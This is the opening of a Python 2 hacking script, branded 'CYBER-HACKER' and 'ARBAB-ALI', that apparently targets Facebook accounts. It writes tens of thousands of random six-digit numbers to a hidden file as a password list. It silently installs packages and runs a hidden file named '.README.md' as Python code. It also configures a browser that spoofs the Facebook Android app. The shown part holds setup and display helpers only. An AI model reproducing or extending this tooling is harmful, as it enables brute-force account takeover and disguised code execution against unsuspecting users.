import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(99265):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
 
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
 
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')
 
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
def exb():
    print '[!] Exit Successfully'
    os.sys.exit()
 
 
def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()
 
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)
 
 
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
 
 
def lodhirt():
    lodhirt = [
     'CYBER-HACKER', '      ', 'CYBER-HACKER', '      ', 'ARBAB-ALI', '      ', 'ARBAB-ALI', '      ', 'RIGHT-HANDED', '      ', 'PLAYER-1.0268', '      ', 'TEAM-CYBER', '      ', 'TEAM-CYBER', '      ', 'ARBAB-MEMON', '      ', 'TEAM CYBER', 'CYBER-GANGE', '      ', 'LEADER', '      ', 'ARBAB-ALI', '      ', 'TEAM-1.0286', '      ', 'CYBER-PLAYER', '      ', 'GANGE-LEADER', '      ', 'BRANDED', '      ', 'ARBAB-MEMON', '      ', 'ARBAB-ALI', '      ', 'ARBAB-ALI\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)
 
 
def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)
 
 
def t():
    time.sleep(1)
 
 
def cb():
    os.system('clear')
